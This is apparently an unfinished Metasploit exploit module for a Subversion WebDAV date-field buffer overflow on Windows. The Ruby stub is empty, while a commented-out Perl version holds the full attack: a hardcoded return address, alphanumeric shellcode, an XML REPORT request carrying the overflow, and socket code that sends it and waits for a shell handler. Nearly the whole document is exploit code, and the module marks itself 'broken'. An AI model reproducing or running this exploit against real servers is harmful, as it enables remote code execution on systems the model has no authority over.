require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Subversion Data Overflow (Win32/WebDAV)',
			'Description'    => %q{
					
			},
			'Author'         => [ 'spoonm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 700,
					'BadChars' => "\x00\x09\x0a\x0b\x0c\x0d\x20\x3e\x3c\x26",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

# hdm ate my warez man.

package Msf::Exploit::subversion_date_win32;
use strict;
use base 'Msf::Exploit';
use Pex::Text;

### Set AutoOpt ExitProcess!!

my $info = {
  'Name'    => 'Subversion Data Overflow (Win32/WebDAV)',
  'Version'  => '$Revision$',
  'Authors' => [ 'spoonm <ninjatools [at] hush.com>', ],
  'Arch'    => [ 'x86' ],
  'OS'      => [ 'win32' ],
  'Priv'    => 1,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The poptop port', 80],
      'URL'   => [1, 'DATA', 'URL', '/svn/spoonm'],
    },
  'Payload' =>
    {
      'Space'     => 700, # We override this to do it dynamically
        'BadChars' => "\x00\x09\x0a\x0b\x0c\x0d\x20><&",
#        'PrependEncoder' => "\xcc",
#      'PrependEncoder'   => "\x81\xC4\xC0\xFB\xFF\xFF", # add esp,0xfffffbc0 (-1088)
      'MinNops'   => 0,
      'MaxNops'   => 0,
    },
  'Nop' =>
    {
      'SaveRegs' => ['esp', 'ebp'],
    },
  'Description'  => '',
  'Refs'  =>
    [
    ],
  'DefaultTarget' => 0,
  'Targets' =>
    [
      ['Bruteforce', ''],
    ],
  'Keys' => ['broken'],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info,}, @_);

  return($self);
}

sub Exploit {
  my $self = shift;

  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');
  my $encodedPayload = $self->GetVar('EncodedPayload');
  my $shellcode   = $encodedPayload->Payload;


  my $url = $self->GetVar('URL');
#  my $ret = 0x77e2db73;
#  my $ret = 0x71aaa441;
  #my $ret = 0x71aa3a4b;
  my $ret = 0x77642534;
#  my $ret = 0x77798428;
#  my $ret = 0x6fc54d83;
#  my $ret = 0x41414141;
  my $day = "AAAA";
  $day .= pack('V', $ret) x 13;
#  $day .= "\x33\xd2\x33\xc0\xbb\x90\x50\x90\x50\xb0\x08\x42\x8b\xc8\x41\x60\x8d\x14\x0a\xcd\x2e\x3c\x05\x61\x74\xf1\xe2\xf3\x42\x39\x1a\x75\xeb\x39\x5a\x04\x75\xe6\xff\xe2";
#$day .= "TZJJJJJRY" . 
#"VTX630VX4A0B6HH0B30BCVX2BDBH4A2AD0ADTBDQB0ADAVX4Z8BDJOM".
#"\x43\x43\x44\x4d\x43\x33".
#"\x42\x4c\x4b\x4b\x42\x59\x42\x45\x42\x49\x42\x55\x42\x4b\x4a\x30".
#"\x44\x54\x4b\x38\x4a\x4c\x41\x44\x42\x46\x4d\x48\x46\x51\x4c\x30".
#"\x4d\x4c\x50\x32\x4e\x43\x45\x30\x41\x46\x46\x47\x41\x4f\x44\x4e".
#"\x43\x4f\x44\x34\x49\x33\x4c\x31\x45\x47\x4b\x4e\x49\x43\x4c\x45".
#"\x46\x30\x45\x57\x48\x4e\x4f\x4f\x44\x4e\x5a";
##$day = from_utf8({'-string' => $day, '-charset', 'ISO-8859-1'});
#$day .= "LLLLYhAqgUX5AqgUHWSPPSQPPaQURTRCSKVUajyY0Lob0tobjZY0LocjdX0Doe0toejpY0LofhusfqY1Log1TogjgX0Dok0TokmYYpubtfqgOIIIIIIQZVTX630VX4A0B6HH0B30BCVX2BDBH4A2AD0ADTBDQB0ADAVX4Z8BDJOMCSDMCSBLKKB9B5B9BEBKJPD4KXJLA4BFMHFAL0MLPRNSE0A6FWAODNCODDISL1E7KNISL5FPEWHNOODNZ";
#$day .= "LLLLYhS3ezX5S3ezHQSPPUQPPafhv3DTY01\x54\xc3";
#$day .= "LLLLZhym7rX5ym7rHWRPPTRPPafhZTfXf5bIfPDTY01fRDfhmSfXf50JfPDTY09fhTuDfhsafXf5WefPDfh9ZfhiLfXf5pXfPDTY09fhDuDfhFXfXf5PBfPDfhB9h8iLxX5BgQtPDTYI19fhath4zpbX52TLgPDfhf2DTY09fhyXfXf5mRfPfhIrDTY01fhdRfXf5k2fPDfhBADfht7TYf11fh1BDfhUjfXf5VbfPDfh3ODTY09fhxPDfhsoDTY09fhmPDfhDoTYf19fhiyfXf54FfPDTY09fh93DfhjffXf5MKfPDTY01fhI3Dfhs3DTY09\x54\xc3";
#$day .= "LLLLYhy8hwX5y8hwHQWPPRQPPafhuMfXf5qPfPDTY01fVDfhhjfXf52sfPDTY01fhIuDfhwofXf5hkfPDfh9ZfhpBfXf5nVfPDTY01fhvuDfh7KfXf5hQfPDfhB9h1asEX5ionIPDTYI19fhathbOdaX5kaXdPDfhf2DTY09fhXXfXf5LRfPfhmrDTY01fhEWfXf5q7fPDfhWADfht7TYf19fhaBDfhnDfXf5lLfPDfhOODTY09fhGPDfhToDTY09fhLPDfhDoTYf11fhJrfXf5uMfPDTY01fhm3DfhZafXf5RLfPDTY09fhk3D\x54\xc3";
#$day .= "LLLLZhsWyUX5sWyUHVQPPRRPPafhfzfXf55gfPDTY01fSDfhJWfXf5tKfPDTY09fhQuDfhREfXf56AfPDfh9ZfhMefXf51rfPDTY01fhZuDfh6ofXf5JufPDfhB9hYrioX5fctcPDTYI19fhath7vLdX5kXpaPDfhQ2DTY09fhVbfXf5BhfPfhcrDTY01fhHUfXf5p5fPDfhVADFVDNfhIrfXf51zfPDfhhFDTY01fhCBfhqODTY09fh5PDfhpoDTY01fhJPDfhDoTYf19fhKVfXf5IifPDTY01fh73Dfh4ifXf5IDfPDTY01fhV3D\x54\xc3";
#$day .= "LLLLZh8p18X58p18HUWPPURPPafhQvfXf5hkfPDTY01fSDfhFEfXf5ERfPDTY09fh3uDfhoMfXf5OIfPDfh9ZfhPbfXf5ypfPDTY01fhIuDfhmqfXf5fkfPDfhB9hDvRjX5BgOaPDTYI19fhathEtOjX5TZsoPDfhd2DTY01fhqmfXf5qCfPDTY01hVa7jX5EhWiPDfhDNDTY09fhyBDfhPBfXf5jMfPDfSDfhK5DTY01fhF2fXf55LfPDTY01fhCffhmODTY01fhBQfXf5JGfPTYf19fhh6DTY01fhP3fhmoDTY09fhhPDhC3DoDTYI19\x54\xc3";
#$day .= "LLLLYh7CjVX57CjVHTWPPQQPPafhZofXf5orfPDTY09fVDfhZOfXf5LXfPDTY09fhKuDfh4rfXf5jvfPDfh9Zfh5SfXf5xAfPDTY09fhGuDfhOXfXf5ABfPDfhB9h3IGdX5KXZoPDTYI19fhathpaMVX5YOqSPDfhJ2DTY09fhvVfXf5vxfPDTY01hsgQvX5wn1uPDfhONDTY09fhgBDfhQEfXf5JJfPDfRDfhv5DTY01fhXMfXf5y3fPDTY01fhCffh5ODTY09fhMnfXf5ExfPTYf19fhf6DTY01fhP3fhhoDTY01fhMPDfhDoTYf11\x54\xc3";
$day .= "TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIOKLPPPZ00P7C8IL7JINPW3RFMQ9ZKOTOQRSPLCO2UTXMVN7LEU3Q2TJOWIEJT5L0P9PZUT2UJKKOKRA";
my $header = "\x90\x50\x90\x50\x90\x50\x90\x50" . $shellcode;
#  $day = to_utf8({ -string => $day, -charset => 'ISO-8859-1'});
#  $day = "<![CDATA[$day]]>";
#  $day = "A";
#  $day .= "A" x 300;

  my $evil = "$day 3 Oct 2000 01:01:01.001 (day 277, dst 1, gmt_off)";

  my $post = qq{<?xml version="1.0" encoding="iso-8859-1"?><S:dated-rev-report xmlns:S="svn:" xmlns:D="DAV:"><D:creationdate>$evil</D:creationdate></S:dated-rev-report>};
#  my $post = qq{<?xml version="1.0" encoding="utf-8"?><S:dated-rev-report xmlns:S="svn:" xmlns:D="DAV:"><D:creationdate>$evil</D:creationdate></S:dated-rev-report>};
  my $postLength = length($post);

my $payload = qq{REPORT $url HTTP/1.1\r
Host: $targetHost\r
User-Agent: SVN/1.0.2 (r9423) neon/0.24.5\r
Content-Length: $postLength\r
Content-Type: text/xml\r
Binary-Data: $header\r
\r
} . $post;

  my $sock = Msf::Socket::Tcp->new
  (
    'PeerAddr'  => $targetHost, 
    'PeerPort'  => $targetPort, 
    'LocalPort' => $self->GetVar('CPORT'),
    'SSL'       => $self->GetVar('SSL'),
  );
  if ($sock->IsError) {
    $sock->PrintLine('[*] Error creating socket: ' . $sock->GetError);
    return;
  }

  open(OUTFILE, '>sadness');
  print OUTFILE $payload;
  close(OUTFILE);

  $self->PrintLine(sprintf("Trying %#08x", $ret));
  $sock->Send($payload);
  $self->PrintLine('Sent data, waiting for response.');
  my $data = $sock->Recv(-1, 5);
  if(length($data)) {
    $self->PrintLine("Got data back, no good.");
    $self->PrintDebugLine(3, $data);
    return;
  }
  elsif(!$sock->GetSocket->connected || $sock->IsError) {
    $self->PrintLine('Socket disconnected, bad sign, sticking around anyway.');
  }
  else {
    $self->PrintLine("Didn't get data back, good sign, waiting painfully long for searcher code...");
  }
  sleep(120);

#    select(undef, undef, undef, $bruteWait); # ghetto sleep
  $self->Handler($sock);
  $sock->Close;
  return;
}

1;

=end


end
end	
